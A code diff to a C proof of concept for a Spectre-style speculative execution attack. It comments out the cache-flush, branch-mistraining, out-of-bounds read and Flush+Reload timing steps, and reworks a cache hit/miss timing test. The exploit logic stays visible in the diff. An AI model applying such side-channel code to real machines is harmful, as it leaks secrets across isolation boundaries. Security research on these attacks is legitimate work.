@@ -145,13 +145,13 @@ int leakValue(size_t leak_offset){
      
     for(int iteration = 0; iteration < ITERATIONS; iteration++){ // do ITERATIONS measurements
    
-        // cache_remove(array2)
-        for(int i = 0; i < VALUES; i++){
-            cache_remove(array2_ctx[i]);
-        }
+        // // cache_remove(array2)
+        // for(int i = 0; i < VALUES; i++){
+        //     cache_remove(array2_ctx[i]);
+        // }
    
-        // make sure everything is really removed from cache
-        memory_fence();
+        // // make sure everything is really removed from cache
+        // memory_fence();
     
         // mistrain + access out of bounds
      
@@ -251,45 +251,46 @@ int main() {
         return EXIT_FAILURE;
     }
     
-    
-    clflush(&size);
+    uint32_t size;
+    probe(&size);
     uint64_t a = probe(&size);
+    clflush(&size);
     uint64_t b = probe(&size);
 
-    printf("Hit test - %llu\nMiss test - %llu\n", b, a);
+    printf("Hit test - %llu\nMiss test - %llu\n", a, b);
             
-    /*********** Spectre ************/
-    int n_train = 10;
-    int n = 0;
-    // Flush the Probe array
-    memset(array, 0, sizeof(array));
-    for (size_t i = 0; i < 256; i++) {
-        clflush(array + i * 4096);
-    }
+    // /*********** Spectre ************/
+    // int n_train = 10;
+    // int n = 0;
+    // // Flush the Probe array
+    // memset(array, 0, sizeof(array));
+    // for (size_t i = 0; i < 256; i++) {
+    //     clflush(array + i * 4096);
+    // }
     
-    // Mistrain
-    for(size_t i=0; i<n_train; i++){
-            // flush(&size);
-            victim(i);
-    }
+    // // Mistrain
+    // for(size_t i=0; i<n_train; i++){
+    //         // flush(&size);
+    //         victim(i);
+    // }
 
-    // Reading out-of-bound value
-    clflush(&size);
-    victim(public[n++ + 6]);
+    // // Reading out-of-bound value
+    // clflush(&size);
+    // victim(public[n++ + 6]);
 
-    // Recover the secret
-    uint64_t timings[256];
-    for(size_t i = 0; i < 256; i++){
-        timings[i] = probe((char *)array+4096 *i);
-    }
+    // // Recover the secret
+    // uint64_t timings[256];
+    // for(size_t i = 0; i < 256; i++){
+    //     timings[i] = probe((char *)array+4096 *i);
+    // }
 
-    // Record byte value that hits in the cache
-    // EXCEPT for 0xff (which is the dummy value).
-    for (int j = 0; j < 256; ++j)
-    {
-        printf("[%d] %llu\n", j, timings[j]);
-    }
-    /*********** Spectre ************/
+    // // Record byte value that hits in the cache
+    // // EXCEPT for 0xff (which is the dummy value).
+    // for (int j = 0; j < 256; ++j)
+    // {
+    //     printf("[%d] %llu\n", j, timings[j]);
+    // }
+    // /*********** Spectre ************/
 
     return 0;
 }
